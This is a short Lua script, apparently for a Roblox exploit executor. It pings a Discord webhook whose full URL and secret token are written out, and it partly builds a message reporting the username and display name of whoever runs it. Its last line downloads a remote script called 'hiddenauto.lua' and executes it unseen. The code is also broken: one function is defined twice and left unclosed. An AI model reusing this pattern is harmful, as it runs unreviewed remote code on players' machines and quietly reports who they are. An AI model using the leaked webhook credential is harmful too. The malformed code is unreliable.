-- Function to send notification to Discord
local function send_discord_notification(webhook_url, message)
    local data = {
        content = message
    }
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local success, response = pcall(function()
        return syn.request({
            Url = webhook_url,
            Method = "POST",
            Headers = headers,
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)
    
    if success and response.Success then
        print("Notification sent successfully to Discord!")
    else
        warn("Failed to send notification to Discord.")
        if response then
            warn("Status code:", response.StatusCode)
            warn("Response body:", response.Body)
        end
    end
end

-- Define your webhook URL
local webhook_url = "https://discord.com/api/webhooks/1217348383170236467/17G9oEQYtyvAxdhgScnSLCr6K6BGvZI6Pyb9-pqEqsc2_CJW7gBhtEPSdZZThYHB3vuy"

-- Send notification
send_discord_notification(webhook_url, "@everyone Lua script executed from Roblox!")

-- Function to send a notification to Discord and execute the Lua script
local function send_discord_notification(username, display_name)
    local data = {
        content = "Lua script executed by: " .. username .. " (" .. display_name .. ")",
        embeds = {{
            title = "Lua Script Execution",
            description = "@everyone Your Script Has Been Executed.",
            color = 16711680,  -- Color (decimal) for the embed, you can customize this
            fields = {
                { name = "Username", value = username },
{ name = "Display Name", value = display_name }

-- Load and execute the Lua script from the URL
loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/scripts/main/hiddenauto.lua"))()
